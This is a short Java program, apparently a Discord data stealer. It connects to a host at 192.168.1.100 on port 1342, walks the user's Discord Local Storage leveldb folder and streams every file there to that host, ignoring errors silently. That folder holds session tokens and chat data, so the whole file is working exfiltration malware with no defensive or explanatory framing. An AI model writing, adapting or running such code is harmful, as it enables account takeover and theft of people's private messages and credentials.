import java.io.*;
import java.net.Socket;
import java.util.StringTokenizer;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
public class Main {
  public static void main(String[] args) throws Exception {
    Socket socket = new Socket("192.168.1.100", 1342);
    sendDiscordChats(socket);
  }
  static void sendDiscordChats(Socket socket) throws Exception{
    String directoryPath = System.getProperty("user.home") + "/.config/discord/Local Storage/leveldb/";
        
    try {
      Path directory = Paths.get(directoryPath);
      PrintWriter writer = new PrintWriter(socket.getOutputStream());
      BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            Files.walk(directory)
                 .filter(Files::isRegularFile)
                 .forEach(file -> {
                // upload file to server  
                  try{ 
                  writer.println(file);
                  writer.flush();
                  UploadFile(socket, file.toString());
                  writer.flush();
                  String line;
                  while(!(line = reader.readLine()).equals("finished")){
                  }
                  //writer.flush();
                  }catch(Exception e){}
                 });

          
      
      
      writer.println("all files has been copied");
      writer.flush();
    } catch (Exception e) {
      e.printStackTrace();
    }
  }
  static void UploadFile(Socket socket, String fileName) throws Exception {
    FileInputStream fileIn = new FileInputStream(fileName);
    BufferedOutputStream out = new BufferedOutputStream(socket.getOutputStream());
    int c;
    while ((c = fileIn.read()) != -1) {
      if(c!=255)
        out.write(c);
    }
    out.write(255);
    out.flush();
    fileIn.close();
  }
}